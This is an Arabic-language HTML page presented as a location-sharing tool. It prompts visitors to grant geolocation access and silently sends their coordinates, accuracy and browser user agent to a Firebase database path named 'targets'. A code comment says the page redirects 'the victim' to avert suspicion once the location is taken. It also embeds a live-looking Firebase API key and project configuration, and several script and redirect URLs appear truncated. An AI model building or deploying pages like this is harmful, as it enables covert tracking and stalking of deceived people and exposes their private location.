<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>مشاركة موقعي</title>
    
    <link rel="stylesheet" href="https://unpkg.com" />
    
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            font-family: Arial, Tahoma, sans-serif;
            min-height: 100vh;
            color: white;
            background: radial-gradient(circle at top, #102a43 0%, #061929 45%, #000914 100%);
            display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px;
        }
        .container {
            text-align: center; background: rgba(255, 255, 255, 0.05); padding: 30px; border-radius: 15px;
            backdrop-filter: blur(10px); box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
            border: 1px solid rgba(255, 255, 255, 0.1); max-width: 400px; width: 100%;
        }
        h1 { font-size: 24px; margin-bottom: 15px; }
        p { font-size: 14px; color: #b0c4de; margin-bottom: 25px; line-height: 1.6; }
        .btn {
            background: linear-gradient(135deg, #0076ff 0%, #0055ff 100%); color: white; border: none;
            padding: 12px 30px; font-size: 16px; font-weight: bold; border-radius: 25px; cursor: pointer;
            transition: all 0.3s ease; box-shadow: 0 4px 15px rgba(0, 85, 255, 0.4);
        }
        .btn:hover { transform: translateY(-2px); box-shadow: 0 6px 20px rgba(0, 85, 255, 0.6); }
        #status { margin-top: 15px; font-size: 13px; color: #ffc107; }
    </style>

    <script src="https://gstatic.com"></script>
    <script src="https://gstatic.com"></script>
</head>
<body>

    <div class="container">
        <h1>📍 مشاركة الموقع الجغرافي</h1>
        <p>لتتمكن من استلام وتحديد الموقع بدقة على الخريطة التفاعلية، يرجى الضغط على الزر أدناه والموافقة على إذن الوصول المباشر.</p>
        <button class="btn" id="startBtn">اضغط هنا للمشاركة</button>
        <div id="status"></div>
    </div>

    <script>
        // إعدادات الـ Firebase الجديدة والمحدثة الخاصة بمشروعك الحالي
        const firebaseConfig = {
          apiKey: "AIzaSyDN0-VVc22XXx1bDh7rICBMxIBxWQcTc-k",
          authDomain: "mylocationshare-70ce6.firebaseapp.com",
          databaseURL: "https://mylocationshare-70ce6-default-rtdb.firebaseio.com",
          projectId: "mylocationshare-70ce6",
          storageBucket: "mylocationshare-70ce6.firebasestorage.app",
          messagingSenderId: "394362922510",
          appId: "1:394362922510:web:3f0b44013b7677a9c3fe5f",
          measurementId: "G-B3V083SLLY"
        };

        // تهيئة Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const startBtn = document.getElementById('startBtn');
        const statusDiv = document.getElementById('status');

        startBtn.addEventListener('click', () => {
            statusDiv.textContent = "جاري طلب الإذن وجلب الموقع...";
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lng = position.coords.longitude;
                        const accuracy = position.coords.accuracy;

                        // حفظ الإحداثيات فوراً في قاعدة البيانات
                        database.ref('targets/').push({
                            latitude: lat,
                            longitude: lng,
                            accuracy: accuracy,
                            deviceAgent: navigator.userAgent,
                            time: new Date().toLocaleString('ar-EG')
                        }).then(() => {
                            statusDiv.style.color = "#28a745";
                            statusDiv.textContent = "تمت مشاركة الموقع بنجاح! جاري تحويلك...";
                            
                            // توجيه الضحية لإبعاد الشبهة بعد سحب الموقع
                            setTimeout(() => {
                                window.location.href = `https://google.com{lat},${lng}`;
                            }, 1500);
                        }).catch((error) => {
                            statusDiv.style.color = "#dc3545";
                            statusDiv.textContent = "فشل في إرسال البيانات: " + error.message;
                        });
                    },
                    (error) => {
                        statusDiv.style.color = "#dc3545";
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                statusDiv.textContent = "يجب عليك السماح بالوصول للموقع لتحديث الخريطة.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                statusDiv.textContent = "معلومات الموقع غير متوفرة حالياً.";
                                break;
                            case error.TIMEOUT:
                                statusDiv.textContent = "انتهت مهلة طلب الموقع.";
                                break;
                            default:
                                statusDiv.textContent = "حدث خطأ غير معروف.";
                        }
                    },
                    { enableHighAccuracy: true, timeout: 10000 }
                );
            } else {
                statusDiv.textContent = "المتصفح لا يدعم تحديد المواقع.";
            }
        });
    </script>
</body>
</html>
